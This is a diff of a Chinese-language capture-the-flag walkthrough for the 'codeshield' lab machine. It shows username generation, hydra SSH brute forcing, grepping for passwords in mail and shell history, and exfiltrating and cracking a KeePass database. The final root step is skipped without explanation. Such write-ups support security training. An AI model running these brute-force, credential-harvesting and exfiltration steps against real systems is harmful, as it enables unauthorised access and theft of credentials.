@@ -155,6 +155,280 @@ ftp> ls
 226 Directory send OK.
 ```
 
-其中发现了，一个域名：j.carlson@codeshield.hmv，添加一下
+其中发现了，一个邮箱地址：j.carlson@codeshield.hmv，添加一下域名，其他的pdf中发现了一些密码,保存一下
 
+<img width="1436" height="495" alt="图片" src="https://github.com/user-attachments/assets/4dab4a9f-a90f-4dac-99e4-c611cddc5954" />
+
+访问codeshield.hmv，从中找到了成员名单，以及评论中提到的名字，同样添加一下
+
+<img width="944" height="595" alt="图片" src="https://github.com/user-attachments/assets/9517d015-d9a6-415d-a006-cdcd0297d194" />
+
+<img width="317" height="378" alt="图片" src="https://github.com/user-attachments/assets/ad481a21-bfae-4e35-a724-9767d7d9fbde" />
+
+用户名不应该存在空格，将其分开，再尝试生成可能的用户名
+
+```
+┌──(kali㉿kali)-[~]
+└─$ ./username-anarchy/username-anarchy --input-file user > newuser
+```
+
+尝试爆破一下
+
+```
+┌──(kali㉿kali)-[~]
+└─$ hydra -L newuser -P pass ssh://192.168.21.5:22222
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-17 06:33:30
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1550 login tries (l:155/p:10), ~97 tries per task
+[DATA] attacking ssh://192.168.21.5:22222/
+[STATUS] 305.00 tries/min, 305 tries in 00:01h, 1247 to do in 00:05h, 14 active
+[22222][ssh] host: 192.168.21.5   login: valdezk   password: Greatplace2work!
+[STATUS] 277.33 tries/min, 832 tries in 00:03h, 720 to do in 00:03h, 14 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-17 06:39:09
+```
+
+ssh登录一下
+
+```
+┌──(kali㉿kali)-[~]
+└─$ ssh valdezk@192.168.21.5 -p 22222
+The authenticity of host '[192.168.21.5]:22222 ([192.168.21.5]:22222)' can't be established.
+ED25519 key fingerprint is SHA256:Y+iV2eHvzSBp6ZbF+2VqTJdZ5+XyH5tVaxNCzS7tp3I.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.21.5]:22222' (ED25519) to the list of known hosts.
+             @@@                            
+      @@@@@@@@@  @@@@@@                     
+ @@@@@@@@@@@@@@          (@@                
+ @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗                                   
+ @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗             
+  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║             
+  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║             
+    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝             
+     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝              
+        @@@@@@@   @@@                       
+           @@@@@@@                                                           
+
+  _______________________________________________________________________________________________________
+ |  _WARNING: This system is restricted to authorized users!___________________________________________  |
+ | |                                                                                                   | |
+ | | IT IS AN OFFENSE TO CONTINUE WITHOUT PROPER AUTHORIZATION.                                        | |
+ | |                                                                                                   | |
+ | | This system is restricted to authorized users.                                                    | | 
+ | | Individuals who attempt unauthorized access will be prosecuted.                                   | | 
+ | | If you're unauthorized, terminate access now!                                                     | | 
+ | |                                                                                                   | |
+ | |                                                                                                   | |
+ | |___________________________________________________________________________________________________| |
+ |_______________________________________________________________________________________________________|
+valdezk@192.168.21.5's password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-79-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Feb 17 11:32:55 AM UTC 2026
+
+  System load:  0.0                Processes:               237
+  Usage of /:   30.8% of 47.93GB   Users logged in:         0
+  Memory usage: 58%                IPv4 address for enp0s3: 192.168.21.5
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+634 updates can be applied immediately.
+493 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+12 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+valdezk@codeshield:~$ id
+uid=1007(valdezk) gid=1007(valdezk) groups=1007(valdezk)
+```
+
+# 权限提升
+
+寻找一下用户和密码
+
+```
+valdezk@codeshield:~$ cut -d: -f1 /etc/passwd
+root
+daemon
+bin
+sys
+sync
+games
+man
+lp
+mail
+news
+uucp
+proxy
+www-data
+backup
+list
+irc
+gnats
+nobody
+_apt
+systemd-network
+systemd-resolve
+messagebus
+systemd-timesync
+pollinate
+sshd
+syslog
+uuidd
+tcpdump
+tss
+landscape
+fwupd-refresh
+usbmux
+earlyp
+lxd
+rtkit
+dnsmasq
+kernoops
+systemd-oom
+whoopsie
+avahi-autoipd
+nm-openvpn
+avahi
+cups-pk-helper
+sssd
+speech-dispatcher
+saned
+colord
+geoclue
+pulse
+gnome-initial-setup
+hplip
+gdm
+vboxadd
+ftp
+cowrie
+mysql
+postfix
+dovecot
+dovenull
+clamav
+amavis
+debian-spamd
+vmail
+mlmmj
+iredadmin
+iredapd
+netdata
+postgres
+mitchellt
+valdezk
+carlsonj
+mansourm
+tanx
+coccia
+xrdp
+valdezk@codeshield:~$ grep -Pnir pass
+.thunderbird/fx2h7mhy.default-release/ImapMail/mail.codeshield.hmv/INBOX:48:Password: D@taWh1sperer!
+```
+
+尝试爆破一下
+
+```
+┌──(kali㉿kali)-[~]
+└─$ hydra -L user -p D@taWh1sperer! ssh://192.168.21.5:22222
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-17 07:04:49
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 75 login tries (l:75/p:1), ~5 tries per task
+[DATA] attacking ssh://192.168.21.5:22222/
+[22222][ssh] host: 192.168.21.5   login: mitchellt   password: D@taWh1sperer!                                                             
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-17 07:05:07
+valdezk@codeshield:~$ su - mitchellt
+Password: 
+mitchellt@codeshield:~$ id
+uid=1006(mitchellt) gid=1006(mitchellt) groups=1006(mitchellt)
+```
+
+继续寻找密码
+
+```
+mitchellt@codeshield:~$ cat .bash_history 
+echo 'EARL!YP7DeVel@OP'| su - earlyp -c "cp -r /home/earlyp/Development/mining ."
+echo 'EARL!YP7DeVel@OP'| su - earlyp -c "cp -r /home/earlyp/Development/mining /tmp"
+cp -r /tmp/mining .
+ls
+cd mining/
+ls
+exit
+```
+
+切换用户
+
+```
+mitchellt@codeshield:~$ su - earlyp
+Password: 
+earlyp@codeshield:~$ id
+uid=1000(earlyp) gid=1000(earlyp) groups=1000(earlyp),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
+```
+
+寻找到密码文件，下载下来进行破解
+
+```
+earlyp@codeshield:~$ grep -Pnir password
+.cache/keepassxc/keepassxc.ini:2:LastActiveDatabase=/home/earlyp/Documents/Passwords.kdbx
+.cache/keepassxc/keepassxc.ini:4:LastDatabases=/home/earlyp/Documents/Passwords.kdbx
+.cache/keepassxc/keepassxc.ini:6:LastOpenedDatabases=/home/earlyp/Documents/Passwords.kdbx
+earlyp@codeshield:~$ cd Documents/
+earlyp@codeshield:~/Documents$ ls -la
+total 12
+drwxr-xr-x  2 earlyp earlyp 4096 Aug 28  2023 .
+drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..
+-rw-------  1 earlyp earlyp 1918 Aug 28  2023 Passwords.kdbx
+earlyp@codeshield:~/Documents$ python3 -m http.server 2468
+Serving HTTP on 0.0.0.0 port 2468 (http://0.0.0.0:2468/) ...
+┌──(kali㉿kali)-[~]
+└─$ wget http://192.168.21.5:2468/Passwords.kdbx
+--2026-02-17 07:14:31--  http://192.168.21.5:2468/Passwords.kdbx
+Connecting to 192.168.21.5:2468... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1918 (1.9K) [application/octet-stream]
+Saving to: ‘Passwords.kdbx’
+
+Passwords.kdbx    100%[==========>]   1.87K  --.-KB/s    in 0.003s  
+
+2026-02-17 07:14:31 (580 KB/s) - ‘Passwords.kdbx’ saved [1918/1918]
+┌──(kali㉿kali)-[~]
+└─$ keepass2john Passwords.kdbx > hash
+┌──(kali㉿kali)-[~]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+
+有点过于慢了，我便去拿了个密码
+
+```
+earlyp@codeshield:~/Documents$ su 
+Password: 
+root@codeshield:/home/earlyp/Documents# id
+uid=0(root) gid=0(root) groups=0(root)
 ```
